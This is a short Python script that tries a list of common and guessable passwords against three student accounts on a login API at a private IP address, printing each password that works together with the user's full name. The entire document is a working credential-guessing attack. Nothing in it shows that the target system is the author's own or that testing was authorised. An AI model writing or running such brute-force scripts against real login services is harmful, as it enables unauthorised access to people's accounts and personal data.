import urllib.request
import json

passwords = ["Password@2026", "Student@2026", "student123", "demo123", "student", "Pramaan@2026", "admin123"]
users = ["student_demo", "student_aarav", "student_priya"]

for u in users:
    for p in passwords:
        url = "http://10.31.11.118:8000/api/v1/auth/login"
        req = urllib.request.Request(
            url,
            data=json.dumps({
                "username": u,
                "password": p,
                "requested_role": "student"
            }).encode(),
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        try:
            with urllib.request.urlopen(req) as resp:
                data = json.loads(resp.read().decode())
                print(f"FOUND PASSWORD FOR {u}: '{p}' -> Name: {data.get('user', {}).get('full_name')}")
                break
        except Exception:
            pass
